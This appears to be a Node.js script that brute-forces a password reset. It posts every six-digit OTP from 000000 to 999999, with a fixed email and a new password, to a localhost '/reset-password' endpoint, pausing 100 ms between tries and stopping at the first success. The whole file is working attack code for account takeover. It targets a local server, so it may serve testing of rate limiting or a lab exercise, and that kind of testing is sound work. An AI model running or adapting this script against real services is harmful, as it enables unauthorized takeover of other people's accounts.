const axios = require("axios");

const sendRequest = async (otp) => {
  try {
    const res = await axios.post("http://localhost:3000/reset-password", {
      email: "iodasjiio@gmail.com",
      otp: otp,
      newPassword: "aisjodoasjd"
    });
    console.log(res.data);
    return true; 
  } catch (err) {
    console.error(err.response ? err.response.data : err.message, otp);
    return false; 
  }
};

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const main = async () => {
  for (let i = 0; i <= 999999; i++) {
    const otp = i.toString().padStart(6, '0'); 
    const success = await sendRequest(otp);
    if (success) {
      console.log(`Successful request with OTP: ${otp}`);
      break; 
    }
    await delay(100); 
  }
};

main();